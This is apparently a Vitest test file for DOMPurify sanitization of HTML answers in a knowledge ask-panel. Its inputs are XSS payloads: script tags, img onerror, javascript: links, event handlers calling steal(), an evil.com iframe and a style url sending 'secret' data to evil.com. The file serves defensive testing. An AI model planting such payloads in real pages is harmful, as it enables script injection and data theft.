import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// DOMPurify needs a window object in Node — create one via jsdom
const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

const ALLOWED_TAGS = [
	'p', 'br', 'ul', 'ol', 'li', 'strong', 'em', 'b', 'i',
	'code', 'pre', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
	'a', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
	'span', 'div', 'hr', 'del', 'sup', 'sub',
];

const ALLOWED_ATTR = ['href', 'target', 'rel', 'class', 'id'];

describe('DOMPurify sanitization for knowledge ask-panel v-html content', () => {
	it('strips script tags from rendered answer', () => {
		const malicious = '<p>Answer</p><script>alert("xss")</script>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('<script>');
		expect(clean).toContain('<p>Answer</p>');
	});

	it('strips onerror from img tags (img not in allowed list)', () => {
		const malicious = '<p>text</p><img src=x onerror=alert(1)>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('<img');
		expect(clean).not.toContain('onerror');
	});

	it('strips javascript: href from anchor tags', () => {
		const malicious = '<a href="javascript:alert(1)">click</a>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('javascript:');
		expect(clean).toContain('<a');
	});

	it('preserves safe markdown HTML in answers', () => {
		const safe = '<h1>Answer</h1><p>The result is <strong>42</strong>.</p><ul><li>Source 1</li></ul>';
		const clean = purify.sanitize(safe, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).toBe(safe);
	});

	it('strips event handler attributes from allowed tags', () => {
		const malicious = '<p onclick="alert(1)">text</p><div onmouseover="steal()">hover</div>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('onclick');
		expect(clean).not.toContain('onmouseover');
		expect(clean).toContain('<p>text</p>');
	});

	it('handles empty string input', () => {
		expect(purify.sanitize('', { ALLOWED_TAGS, ALLOWED_ATTR })).toBe('');
	});

	it('strips iframe and object tags', () => {
		const malicious = '<p>safe</p><iframe src="evil.com"></iframe><object data="evil.swf"></object>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('<iframe');
		expect(clean).not.toContain('<object');
		expect(clean).toContain('<p>safe</p>');
	});

	it('strips style attribute used for data exfiltration', () => {
		const malicious = '<p style="background:url(evil.com/steal?data=secret)">text</p>';
		const clean = purify.sanitize(malicious, { ALLOWED_TAGS, ALLOWED_ATTR });
		expect(clean).not.toContain('style');
		expect(clean).toContain('<p>text</p>');
	});
});
